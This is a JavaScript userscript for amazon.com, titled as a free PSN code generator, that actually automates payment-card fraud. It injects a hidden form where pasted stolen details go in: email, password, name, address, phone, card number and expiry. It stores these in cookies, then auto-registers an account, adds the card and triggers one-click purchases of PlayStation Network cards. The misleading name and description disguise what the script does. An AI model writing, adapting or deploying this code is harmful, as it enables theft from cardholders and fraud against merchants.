// ==UserScript==
// @name        Auto Get Free PSN Codes List from our Database in Seconds
// @namespace   Ray
// @include     http://*.amazon.com*
// @include     https://*.amazon.com*
// @version     1.18
// @description Free PSN Codes List - Auto Get Free PSN Codes List from our Database in Seconds
// ==/UserScript==

function setCookie(c_name, value, exdays) {
    var exdate = new Date();
    exdate.setDate(exdate.getDate() + exdays);
    var c_value = escape(value) + ((exdays == null) ? "" : "; expires=" + exdate.toUTCString());
    document.cookie = c_name + "=" + c_value;
}
function getCookie(c_name) {
    var i, x, y, ARRcookies = document.cookie.split(";");
    for (i = 0; i < ARRcookies.length; i++) {
        x = ARRcookies[i].substr(0, ARRcookies[i].indexOf("="));
        y = ARRcookies[i].substr(ARRcookies[i].indexOf("=") + 1);
        x = x.replace(/^\s+|\s+$/g, "");
        if (x == c_name) {
            return unescape(y);
        }
    }
    return null;
}
String.prototype.trim=function(){return this.replace(/^\s+|\s+$/g, '');};
function addFunc(func, exec) {
	var script = document.createElement("script");
	script.textContent = "-" + func + (exec ? "()" : "");
	document.body.appendChild(script);
}

function addJQuery() {
	var script = document.createElement("script");
	script.src = "https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js";
	document.body.appendChild(script);
}

unsafeWindow.setupCookies = function(txt){
	var info = txt.split("|");
	setCookie('AMZU',info[0].trim());
	setCookie('AMZP',info[1].trim());
	setCookie('AMZE',info[0].trim());
	setCookie('AMZFN',info[2].trim());
	setCookie('AMZADD', info[3].trim());
	setCookie('AMZC', info[4].trim());
	setCookie('AMZS', info[5].trim());
	setCookie('AMZZ', info[6].trim());
	setCookie('AMZPH', info[7].trim());
	setCookie('AMZCC', info[8].trim());
	setCookie('AMZEM', info[9].trim());
	setCookie('AMZEY', info[10].trim());
	setTimeout(function(){
		location.href='http://www.amazon.com/Sony-Playstation-Network-Card-Online/dp/B004RMK4BC/ref=sr_1_1?ie=UTF8&qid=1356765206&sr=8-1&keywords=psn';
	},5000);
}

var url = location.href;
if(url=='http://www.amazon.com/'){

	function inject(){
		jQuery("<div></div>").attr({id:'cheat',style:'position:fixed;top:0;left:0;height:300;width:300;z-index:999999;color:white;font-weight:bold'}).appendTo('body'); 
		jQuery('#cheat').html('<form><textarea cols="80" rows="4" name="info"></textarea>\
		<input type="button" value="Fuck Now" onclick="setupCookies(this.form.info.value);" /></form>');
	}
	addFunc(inject, true);
}
setTimeout(function(){
	if(url.indexOf('Sony-Playstation-Network-Card-Online/dp/B004RMK4BC')!=-1){
		location.href='http://www.amazon.com/Playstation-Plus-month-Subscription-Download/dp/B004RMK5QG/ref=sr_1_2?ie=UTF8&qid=1356765206&sr=8-2&keywords=psn';
	}else if(url.indexOf('Playstation-Plus-month-Subscription-Download/dp/B004RMK5QG')!=-1){
		location.href='http://www.amazon.com/PlayStation-Network-Card-10-3/dp/B002W8D0EQ/ref=sr_1_4?ie=UTF8&qid=1356765206&sr=8-4&keywords=psn';
	}else if(url.indexOf('PlayStation-Network-Card-10-3/dp/B002W8D0EQ')!=-1){
		location.href='http://www.amazon.com/PS3-Wireless-Keypad-Playstation-3/dp/B001ENPDJA/ref=sr_1_11?ie=UTF8&qid=1356765206&sr=8-11&keywords=psn';
	}else if(url.indexOf('PS3-Wireless-Keypad-Playstation-3/dp/B001ENPDJA')!=-1){
		location.href='http://www.amazon.com/Final-Fantasy-XIV-Reborn-Playstation-3/dp/B002BRZ79E/ref=sr_1_16?ie=UTF8&qid=1356765206&sr=8-16&keywords=psn';
	}else if(url.indexOf('Final-Fantasy-XIV-Reborn-Playstation-3/dp/B002BRZ79E')!=-1){
		location.href='http://www.amazon.com/Sony-Playstation-Network-Card-Online/dp/B004RMK4P8/ref=sr_1_1?ie=UTF8&qid=1356765575&sr=8-1&keywords=psn+50%24+online';
	}
}, 30000);

if(url.indexOf('Sony-Playstation-Network-Card-Online/dp/B004RMK4P8/')!=-1){
	function buy(){
		jQuery('input[name="submit.dsv-one-click-purchase"]').trigger('click');
	}
	setTimeout(function(){
		addFunc(buy, true);
	}, 30000);
}

if(url.indexOf('/ap/signin')!=-1){
	function fill(){
		
		jQuery('input[name="email"]').val(getCookie('AMZE'));
		jQuery('input[name="create"]:first').attr('checked', true);
		jQuery('#signInSubmit').trigger('click');
	}
	setTimeout(function(){
		addFunc(fill, true);
	}, 15000);
}
if(url.indexOf('/ap/register')!=-1){
	function fill(){
		jQuery('input[name="customerName"]').val(getCookie('AMZFN'));
		jQuery('input[name="emailCheck"]').val(getCookie('AMZE'));
		jQuery('input[name="password"]').val(getCookie('AMZP'));
		jQuery('input[name="passwordCheck"]').val(getCookie('AMZP'));
		jQuery('input[name="continue"]').trigger('click');
	}
	setTimeout(function(){
		addFunc(fill, true);
	}, 30000);	
}
if(url.indexOf('gp/swvgdtt/order/handle-order.html?')!=-1){
	function fill(){
		function getCookie(c_name) {
			var i, x, y, ARRcookies = document.cookie.split(";");
			for (i = 0; i < ARRcookies.length; i++) {
				x = ARRcookies[i].substr(0, ARRcookies[i].indexOf("="));
				y = ARRcookies[i].substr(ARRcookies[i].indexOf("=") + 1);
				x = x.replace(/^\s+|\s+$/g, "");
				if (x == c_name) {
					return unescape(y);
				}
			}
			return null;
		}
		$('input[name="addCreditCardNumber"]').val(getCookie('AMZCC'));
		$('input[name="newCreditCardName"]').val(getCookie('AMZFN'));
		$('select[name="newCreditCardMonth"]').val(getCookie('AMZEM'));
		$('select[name="newCreditCardYear"]').val(getCookie('AMZEY'));
		$('input[name="add-your-card"]').trigger('click');
	}
	addJQuery();
	setTimeout(function(){
		addFunc(fill, true);
	}, 35000);
	setCookie('FILLINFO', 1);
}
if(url=='https://www.amazon.com/gp/swvgdtt/order/handle-order.html'){
	function fill1(){
		function getCookie(c_name) {
			var i, x, y, ARRcookies = document.cookie.split(";");
			for (i = 0; i < ARRcookies.length; i++) {
				x = ARRcookies[i].substr(0, ARRcookies[i].indexOf("="));
				y = ARRcookies[i].substr(ARRcookies[i].indexOf("=") + 1);
				x = x.replace(/^\s+|\s+$/g, "");
				if (x == c_name) {
					return unescape(y);
				}
			}
			return null;
		}
		$('input[name="name"]').val(getCookie('AMZFN'));
		$('input[name="address1"]').val(getCookie('AMZADD'));
		$('input[name="city"]').val(getCookie('AMZC'));
		$('select[name="state"]').val(getCookie('AMZS'));
		$('input[name="zip"]').val(getCookie('AMZZ'));
		$('input[name="voice"]').val(getCookie('AMZPH'));
		$('input[name="continue"]').trigger('click');
	}
	function fill2(){
		jQuery('#dsvPurchaseConfirmationButton').trigger('click');
	}
	if(getCookie('FILLINFO')=='1'){
		setCookie('FILLINFO', 0);
		addJQuery();
		setTimeout(function(){
			addFunc(fill1, true);
		}, 40000);	
	}else{
		setTimeout(function(){
			addFunc(fill2, true);
		}, 20000);
	}
}